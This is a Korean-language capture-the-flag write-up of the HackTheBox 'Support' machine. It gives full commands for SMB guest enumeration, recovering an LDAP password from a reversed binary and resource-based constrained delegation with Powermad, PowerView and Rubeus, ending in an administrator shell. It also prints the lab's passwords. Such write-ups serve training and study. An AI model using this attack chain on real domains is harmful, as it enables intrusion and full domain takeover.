# Support - HackTheBox
## Recon
```bash
sudo nmap -p 135,139,3268,3269,389,445,464,49664,49667,49678,49690,49695,49714,53,593,5985,636,88,9389 -sC -sV -vv -oA support 10.129.230.181
```
<img width="1084" height="379" alt="image" src="https://github.com/user-attachments/assets/d9cf81d0-544f-468d-9162-08422388e501" />

<br>
<br>

- KERBEROS(88)
- LDAP(389)
- SMB(445)
- WINRM(5985)

<br>

- `/etc/hosts`에 `support.htb` 추가.
<img width="1084" height="71" alt="image" src="https://github.com/user-attachments/assets/e574bee0-e430-4a5b-8cb5-3cda9a91b1bf" />

---
## SMB
- `guest` 로그인 성공.
```bash
smbmap -u 'guest' -p '' -H 10.129.230.181
```
<img width="1086" height="218" alt="image" src="https://github.com/user-attachments/assets/b4d10705-9c53-417c-af48-3c39ed1669ab" />

<br>
<br>

- `/support-tools`에서 모든 파일 다운로드.
```bash
smbclient -U guest //10.129.230.181/support-tools
```
<img width="1086" height="443" alt="image" src="https://github.com/user-attachments/assets/37929241-6bc8-451f-96ed-0f1c463d4422" />

<br>
<br>

- 구글에서 `download`를 붙여서 검색을 해보면 `UserInfo.exe`를 제외하고는 나머지 공개적으로 다운로드 가능.
- `UserInfo.exe.zip` 압축 해제.
```bash
unzip ../UserInfo.exe.zip
```
<img width="1082" height="180" alt="image" src="https://github.com/user-attachments/assets/c38fbcff-75ff-4104-97ff-3ffa5e8e4b4b" />

<br>
<br>

- `wine`으로 리눅스에서 `UserInfo.exe`를 실행 가능.(32비트라 wine32 설치 필요)
<img width="1084" height="341" alt="image" src="https://github.com/user-attachments/assets/22aaeffd-f116-4737-9ef4-1494f47008ac" />

<br>
<br>

- 소스코드를 확인하기 위해서 윈도우 VM에서 `DNSpy`로 리버싱.
- `getPassword`함수에서 복호화 된 암호를 가져와서 `LDAP`인증을 진행하는 것처럼 확인 됨.
<img width="676" height="238" alt="image" src="https://github.com/user-attachments/assets/1432c0cc-34df-478b-b7ba-887e92d8da42" />

<br>
<br>

<img width="676" height="402" alt="image" src="https://github.com/user-attachments/assets/8d92756e-ee24-479c-bda6-396bd3551acd" />

<br>
<br>

- `wireshark`를 사용하여 패킷 캡쳐.
- `nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz` 비밀번호 획득.
```bash
wine UserInfo.exe user -username asdf
```
<img width="941" height="475" alt="image" src="https://github.com/user-attachments/assets/0c9baea9-f5ae-4597-a236-3893a65796ba" />

<br>
<br>

- `--rid-brute` 옵션을 사용하여 유저 목록 수집.
```bash
nxc smb 10.129.230.181 -u 'guest' -p '' --rid-brute|grep SidTypeUser
```
<img width="1082" height="522" alt="image" src="https://github.com/user-attachments/assets/efce7daf-e676-43b8-9980-1aae42c37153" />

<br>
<br>

- `dc`를 `/etc/hosts`에 추가.
<img width="1083" height="70" alt="image" src="https://github.com/user-attachments/assets/719e44a9-5bb6-496a-8bbb-88bb76f2cb99" />

<br>
<br>

- `ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz` 로그인 가능.
```bash
nxc smb 10.129.230.181 -u users -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'
```
<img width="1082" height="298" alt="image" src="https://github.com/user-attachments/assets/695d6bb3-6a77-4e51-b221-99b85e1e39b6" />

---
## LDAP
- 로그인은 가능하지만 셸 생성이 불가능.
- `ldapsearch`를 사용하여 정보 수집.
```bash
ldapsearch -v -x -D ldap@support.htb -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b 'dc=support,dc=htb' -H 'ldap://10.129.230.181' "(objectclass=person)" > ldap
```
<img width="1082" height="148" alt="image" src="https://github.com/user-attachments/assets/239daa2b-1bbd-4f60-b509-0d3b50836ed1" />

<br>
<br>

- 유일한 요소들 중 `info`를 발견.
```bash
cat ldap|awk '{print $1}'|sort|uniq -c|sort -nr
```
<img width="1082" height="378" alt="image" src="https://github.com/user-attachments/assets/a822e0b6-184a-4824-91d6-16528684a4db" />

<br>
<br>

- 특정 유저의 비밀번호로 생각.
<img width="1082" height="421" alt="image" src="https://github.com/user-attachments/assets/1b2715cc-1900-4c5f-abb2-6c11a1601ef8" />

<br>
<br>

- `support`유저 로그인.
```bash
nxc smb 10.129.230.181 -u users -p 'Ironside47pleasure40Watchful'
```
<img width="1082" height="340" alt="image" src="https://github.com/user-attachments/assets/63bab368-4f8f-4073-b9f4-446f608a0df1" />

<br>
<br>

- `winrm`로그인 성공.
```bash
nxc winrm 10.129.230.181 -u support -p 'Ironside47pleasure40Watchful'
```
<img width="1082" height="190" alt="image" src="https://github.com/user-attachments/assets/d57aa872-0b9f-4dfb-a511-c883fbf20c8d" />

<br>
<br>

- 셸 획득.
<img width="1082" height="295" alt="image" src="https://github.com/user-attachments/assets/8f2e10a6-fe4e-4bf1-a2af-5c900f338af1" />

---
## Privesc
- `SharpHound.exe`를 로컬로부터 다운로드 받아서 실행.
- `bloodhound`로 확인하여 `GenericAll`권한 확인.
<img width="1312" height="383" alt="image" src="https://github.com/user-attachments/assets/ef2669cf-5f8b-4ab0-bf8f-e9ef6d5d7cb3" />

<br>
<br>

- `Powermad.ps1`과 `PowerView.ps`을 로컬로부터 다운로드 받아서 실행.
<img width="1084" height="358" alt="image" src="https://github.com/user-attachments/assets/98fee44c-d074-4e75-be91-54cc2cbf1abb" />

<br>
<br>

- 새로운 계정 생성.
```powershell
New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)
```
<img width="1084" height="70" alt="image" src="https://github.com/user-attachments/assets/92017673-feb2-4766-a461-230b4ad25049" />

<br>
<br>

- `ACE`를 생성하여 `DACL`에 추가.
```powershell
$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid

$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"

$SDBytes = New-Object byte[] ($SD.BinaryLength)

$SD.GetBinaryForm($SDBytes, 0)
```
<img width="1084" height="136" alt="image" src="https://github.com/user-attachments/assets/2e9e4bab-2177-42cd-862a-66b41f78aff4" />

<br>
<br>

- 권한 설정.
```powershell
Get-DomainComputer DC.SUPPORT.HTB | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
```
<img width="1084" height="45" alt="image" src="https://github.com/user-attachments/assets/fb1b9764-87f1-4390-b99b-b930ad115d95" />

<br>
<br>

- `Rubeus.exe`를 로컬로부터 다운로드 받아서 티켓 요청.
- `administrator` 티켓 획득.
```powershell
.\Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:administrator /msdsspn:cifs/DC.SUPPORT.HTB /ptt
```
<img width="1084" height="489" alt="image" src="https://github.com/user-attachments/assets/ceb5395b-57e7-430d-a446-35fd90190533" />

<br>
<br>

- 티켓을 로컬에 저장.
<img width="1084" height="640" alt="image" src="https://github.com/user-attachments/assets/536e8b48-377f-4cb1-b5f4-6d7c213ecb8e" />

<br>
<br>

- `base64`디코딩하여 `ccache`파일로 변환.
```bash
cat ticket |base64 -d > ticket.kirbi

impacket-ticketConverter ticket.kirbi ticket.ccache
```
<img width="1084" height="213" alt="image" src="https://github.com/user-attachments/assets/b6b6a1c7-b58c-4cad-ac28-a8ab9adc0f87" />

<br>
<br>

- `KRB5CCNAME` 변수를 설정하여 `administrator` 셸 생성.
```bash
export KRB5CCNAME=/home/kali/htb/ticket.ccache

impacket-psexec -k -no-pass support.htb/administrator@dc.support.htb
```
<img width="1084" height="427" alt="image" src="https://github.com/user-attachments/assets/d99c7bb7-2fbe-4c5d-8f57-078fda8a2cd4" />

---
## FLAG
- `c:\users\support\desktop\user.txt`
<img width="1084" height="268" alt="image" src="https://github.com/user-attachments/assets/931f36f2-2f53-41fa-8522-2ad05a32dd01" />

<br>
<br>

- `c:\users\administrator\desktop\root.txt`
<img width="1084" height="268" alt="image" src="https://github.com/user-attachments/assets/1c3b7dac-5e9c-4bff-9126-a025e572afd8" />
